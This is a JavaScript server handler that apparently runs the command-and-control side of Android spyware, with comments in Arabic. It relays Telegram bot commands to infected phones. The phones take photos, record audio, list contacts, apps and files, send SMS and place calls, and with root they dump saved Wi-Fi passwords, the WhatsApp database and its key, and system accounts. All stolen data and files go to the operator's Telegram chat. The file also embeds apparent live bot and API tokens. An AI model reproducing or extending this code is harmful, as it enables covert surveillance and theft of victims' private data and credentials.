const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const GROQ_API_KEY = "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const COMMAND_MAP = {};
for (let i = 1; i <= 100; i++) COMMAND_MAP[`/toast${i}`] = `toast:إشعار ${i}`;
for (let i = 1; i <= 100; i++) COMMAND_MAP[`/url${i}`] = `url:https://example.com/p${i}`;
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`;
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص ${i}`;
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة ${i}`;
for (let i = 1; i <= 50; i++) COMMAND_MAP[`/call${i}`] = `call:+1234567890`;

const BASE_COMMANDS = {
  '/fullinfo': 'fullinfo:1',
  '/applist': 'applist:1',
  '/files': 'files:1',
  '/killapp': 'killapp:1',
  '/sysinfo': 'sysinfo:1',
  '/photo': 'take_photo',
  '/contacts': 'get_contacts:1',
  
  // أوامر الروت (Root)
  '/root_wifi': 'root_wifi:1',       // باسوردات الويفي
  '/root_wa': 'root_whatsapp:1',     // داتابيز الواتساب
  '/root_pass': 'root_accounts:1'    // حسابات النظام
};

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: text.substring(i, i + maxLength) })
           }).catch(() => {});
        }
      } else {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
        }).catch(() => {});
      }
    }
  };

  try {
    if (type === 'secret') return res.status(200).send(`"${(await kvCmd('GET', 'app_lock_status')) || 'lock'}"`);
    if (type === 'key') return res.status(200).send(`"${(await kvCmd('GET', 'app_secret_key')) || '1234'}"`);
    if (type === 'message') return res.status(200).send(`"التطبيق مقفول."`);

    if (type === 'banned') {
      if ((await kvCmd('GET', 'banall_active')) === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const expAt = await kvCmd('GET', 'key_exp_at');
      if (expAt && Date.now() > parseInt(expAt)) {
        await kvCmd('DEL', 'key_exp_at');
        await kvCmd('SET', 'app_secret_key', 'EXPIRED');
        return res.status(200).send('"killapp:1"');
      }
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = req.body || '';
      if (typeof body === 'object') body = JSON.stringify(body);
      
      let cleanBody = String(body).trim();
      if (cleanBody.startsWith('{') && cleanBody.endsWith('}')) cleanBody = cleanBody.slice(1, -1);
      cleanBody = cleanBody.replace(/\\n/g, '\n').replace(/"/g, '');
      
      if (type === 'media') {
        try {
          const parts = cleanBody.split('|');
          const filename = parts[0];
          const base64Data = parts[1];
          if (base64Data) {
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', new Blob([buffer]), filename);
            formData.append('caption', `📁 File: ${filename}`);
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(e => console.error(e));
          }
        } catch (err) { await sendToTelegram(`❌ Error media: ${err.message}`); }
      }

      if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات:*\n${cleanBody}`);
      if (type === 'applist') await sendToTelegram(`📱 *البيانات:*\n\n${cleanBody}`);
      if (type === 'files') await sendToTelegram(`📁 *الملفات:*\n\n${cleanBody}`);
      
      return res.status(200).send('"success"');
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message;
      if (!msg) return res.status(200).end();
      const chatId = msg.chat.id.toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      if (command.startsWith('/rec')) {
        const seconds = parseInt(command.replace('/rec', ''));
        if (!isNaN(seconds) && seconds > 0 && seconds <= 300) {
          remoteCommand = `record_${seconds}`;
          await sendToTelegram(`🎙️ \`[REC]\` جاري تسجيل الصوت (${seconds} ثانية)...`);
          return res.status(200).end();
        }
      }

      if (COMMAND_MAP[command]) {
        remoteCommand = COMMAND_MAP[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      if (BASE_COMMANDS[command]) {
        remoteCommand = BASE_COMMANDS[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      switch (command) {
        case '/help': 
          await sendToTelegram(`👑 *لوحة التحكم (Root)*\n\n` +
            `👑 *أوامر الروت الخطيرة:*\n` +
            `/root_wifi (باسوردات الويفي المحفوظة)\n` +
            `/root_wa (قاعدة بيانات الواتساب + المفتاح)\n` +
            `/root_pass (حسابات النظام)\n\n` +
            `⚡ *أوامر عادية:*\n` +
            `/contacts /photo /fullinfo /applist /files\n` +
            `/rec30 /getfile <name>\n\n` +
            `⏱️ *الحظر:* /ban /unban /banall`); 
          break;

        case '/root_wifi': remoteCommand = "root_wifi:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب باسوردات الويفي..."); break;
        case '/root_wa': remoteCommand = "root_whatsapp:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب داتابيز الواتساب والمفتاح..."); break;
        case '/root_pass': remoteCommand = "root_accounts:1"; await sendToTelegram("👑 `[ROOT]` جاري سحب حسابات النظام..."); break;

        case '/getfile': 
          if(args[1]) { remoteCommand = `getfile:${args[1]}`; await sendToTelegram(`⏳ \`[FETCH]\` ${args[1]}...`); }
          break;
          
        default:
          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
